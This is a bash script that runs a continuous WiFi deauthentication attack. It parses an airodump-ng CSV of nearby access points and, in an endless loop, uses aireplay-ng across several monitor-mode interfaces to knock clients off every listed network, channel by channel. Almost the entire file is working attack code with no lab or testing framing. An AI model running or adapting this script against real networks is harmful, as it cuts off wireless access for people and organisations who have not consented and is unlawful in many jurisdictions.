#!/bin/bash

if [[ $1 == "" ]]; then
	echo "No CSV file specified!"
	exit 1
fi

if [[ $2 == "" ]]; then
	deauths=50
else
	deauths=$2
fi

# Define functions.
function deauth() {
	# deauth wlan0mon 00:11:22:33:44:55 900
	interface=$1
	target=$2
	beacons=$3
	aireplay-ng -0 $3 -a $2 $1 > /dev/null 2>&1
}


# Show available monitor mode interfaces.
monitorfaces=$(airmon-ng | grep -Eo 'wlan[0-9]mon' | wc -l)
echo -e "\nMonitor interfaces found: $monitorfaces\nDeauths to send: $deauths\n==============================="

# Strip unwanted shit from the CSV generated from airodump-ng.
cat $1 | sed -n '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/q;p' | sed '/^\s*$/d' | grep -v "BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key" > /tmp/newcsv

# If the targets file exists, get rid of it.
if [ -f "/tmp/targets" ]; then rm -f "/tmp/targets"; fi
if [ -f "/tmp/targets_sorted" ]; then rm -f "/tmp/targets_sorted"; fi

# Generate targets file from the new CSV.
OLDIFS=$IFS
IFS=","
while read bssid fts lts channel speed privacy cipher authentication power beacons iv lanip idlength essid key; do
	echo -e "$channel $bssid $essid" >> /tmp/targets
done < /tmp/newcsv
IFS=$OLDIFS

# Some basic default variables.
lastiface=wlan0mon
lastchannel=1
lastbssid=""

while true; do
	# Read the targets and sort them by channel.
	cat /tmp/targets | sort | while read -r target; do
		targetchannel=$(echo $target | awk '{print $1}')
		targetbssid=$(echo $target | awk '{print $2}')
		echo -e "Last interface: $lastiface\n"
		if [ $lastchannel -eq $targetchannel ]; then
			# This channel is the same as the previous, so lets use the same WiFi card as before.
			echo "Deauthing $targetbssid ($targetchannel) with $lastiface"
			airmon-ng start $iface $targetchannel > /dev/null 2>&1
			deauth $lastiface $targetbssid $deauths &
		else
			break="nu"
			while true; do
				while read iface; do
					if [[ $(ps -aux | grep $iface | grep -v "grep") == "" ]]; then
                                                # No attacks running with this interface. Lets get started.
                                                echo "Deauthing $targetbssid ($targetchannel) with $iface"
                                                airmon-ng start $iface $targetchannel > /dev/null 2>&1
                                                deauth $iface $targetbssid $deauths &
                                                lastiface=$iface
                                                break="yesplease"
                                                break
                                        fi
				done <<< $(airmon-ng | grep -Eo 'wlan[0-9]mon')
				if [[ $break == "yesplease" ]]; then
					break
				fi
			done
		fi

		lastchannel=$targetchannel
		lastbssid=$targetbssid
	done
done
